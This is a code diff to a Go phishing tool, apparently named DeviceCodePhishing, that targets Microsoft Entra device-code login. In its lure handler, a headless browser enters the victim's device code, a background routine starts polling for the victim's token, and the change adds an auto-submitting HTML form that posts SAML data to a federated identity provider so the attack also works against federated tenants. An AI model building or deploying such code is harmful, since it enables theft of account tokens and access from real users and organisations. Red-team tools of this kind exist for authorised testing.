@@ -4,6 +4,7 @@ import (
 	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
 	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
 	"github.com/spf13/cobra"
+	"html/template"
 	"log"
 	"log/slog"
 	"net"
@@ -103,15 +104,33 @@ func lureHandler(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth.UserCode, tenantInfo, userAgent)
+	authData, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth.UserCode, tenantInfo, userAgent)
 	if err != nil {
 		slog.Error("Error during headless browser automation:", err)
 		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
 		return
 	}
 	go startPollForToken(tenantInfo.TenantId, clientId, deviceAuth)
-	slog.Info("Redirecting user to: '" + redirectUri + "'")
-	http.Redirect(w, r, redirectUri, http.StatusFound)
+	slog.Info("Redirecting user via SAML POST to: '" + authData.RedirectUrl + "'")
+
+	// Serve an auto-submitting HTML form that POSTs SAMLRequest and
+	// RelayState to the federated IdP, preserving the device code session context.
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	w.WriteHeader(http.StatusOK)
+	htmlForm := `<!DOCTYPE html>
+<html>
+<body onload="document.getElementById('samlForm').submit();">
+<noscript>
+<p>JavaScript is required. Please enable it to continue.</p>
+</noscript>
+<form id="samlForm" method="POST" action="` + template.HTMLEscapeString(authData.RedirectUrl) + `">
+<input type="hidden" name="SAMLRequest" value="` + template.HTMLEscapeString(authData.SAMLRequest) + `" />
+<input type="hidden" name="RelayState" value="` + template.HTMLEscapeString(authData.RelayState) + `" />
+<noscript><button type="submit">Continue</button></noscript>
+</form>
+</body>
+</html>`
+	w.Write([]byte(htmlForm))
 }
 
 func startPollForToken(tenantId string, clientId string, deviceAuth *entra.DeviceAuth) {
